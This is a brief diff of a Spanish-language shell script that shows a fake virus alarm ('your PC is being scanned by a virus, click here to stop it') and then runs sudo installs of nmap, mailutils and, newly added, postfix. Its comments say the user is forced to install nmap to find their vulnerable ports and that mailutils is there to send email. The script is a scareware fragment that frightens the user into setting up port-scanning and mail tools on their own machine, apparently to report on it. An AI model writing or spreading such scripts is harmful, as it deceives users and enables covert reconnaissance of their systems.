@@ -2,6 +2,7 @@ echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"
 
  sudo apt install nmap -y
  sudo apt install mailutils -y
+ sudo apt install postfix -y
  #le instalamos mailutils para poder mandar correos
 #se lo volvemos a añadir ya que debe ser usado en máquina linux
 #le obligamos a instalar nmap para descubrir que puertos tiene vulnerable
